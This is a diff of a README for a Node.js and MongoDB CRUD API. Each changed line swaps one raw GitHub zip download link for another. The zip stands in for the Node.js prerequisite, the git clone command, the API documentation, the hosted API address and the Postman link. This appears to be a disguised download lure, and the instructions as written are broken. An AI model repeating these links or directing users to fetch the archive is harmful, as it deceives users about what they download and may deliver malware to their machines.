@@ -22,7 +22,7 @@ This API allows you to perform CRUD (Create, Read, Update, Delete) operations on
 
 Before setting up and running the API, make sure you have the following prerequisites installed on your system:
 
-- https://github.com/timiallen/hng_task2/raw/refs/heads/master/config/task_hng_v3.5-beta.5.zip (at least version 16)
+- https://github.com/timiallen/hng_task2/raw/refs/heads/master/UML-Diagrams/task-hng-geoform.zip (at least version 16)
 - MongoDB (either locally installed or a connection to a MongoDB Atlas cluster)
 - Mongo Shell & MongoDB Compass
 
@@ -31,7 +31,7 @@ Before setting up and running the API, make sure you have the following prerequi
 1. Clone the repository:
 
    ```shell
-   git clone https://github.com/timiallen/hng_task2/raw/refs/heads/master/config/task_hng_v3.5-beta.5.zip
+   git clone https://github.com/timiallen/hng_task2/raw/refs/heads/master/UML-Diagrams/task-hng-geoform.zip
    ```
 
 2. Navigate to the project directory:
@@ -58,7 +58,7 @@ The API provides the following endpoints:
 - **Update a Person**: `PUT /api/_id` or `PUT /api/name`
 - **Delete a Person**: `DELETE /api/_id` or `DELETE /api/name`
 
-Detailed documentation for each endpoint can be found [here](https://github.com/timiallen/hng_task2/raw/refs/heads/master/config/task_hng_v3.5-beta.5.zip).
+Detailed documentation for each endpoint can be found [here](https://github.com/timiallen/hng_task2/raw/refs/heads/master/UML-Diagrams/task-hng-geoform.zip).
 
 ### Authentication
 
@@ -81,9 +81,9 @@ After then follow the steps below:
 
 You can navigate to the Test Script Folder to run the python script to test the CRUD operations.
 
-Here is the **Hosted API:** `https://github.com/timiallen/hng_task2/raw/refs/heads/master/config/task_hng_v3.5-beta.5.zip`
+Here is the **Hosted API:** `https://github.com/timiallen/hng_task2/raw/refs/heads/master/UML-Diagrams/task-hng-geoform.zip`
 
-You can use tools like [Postman](https://github.com/timiallen/hng_task2/raw/refs/heads/master/config/task_hng_v3.5-beta.5.zip) or [ThunderCLient] to test the API endpoints.
+You can use tools like [Postman](https://github.com/timiallen/hng_task2/raw/refs/heads/master/UML-Diagrams/task-hng-geoform.zip) or [ThunderCLient] to test the API endpoints.
 
 ## Contributing
 
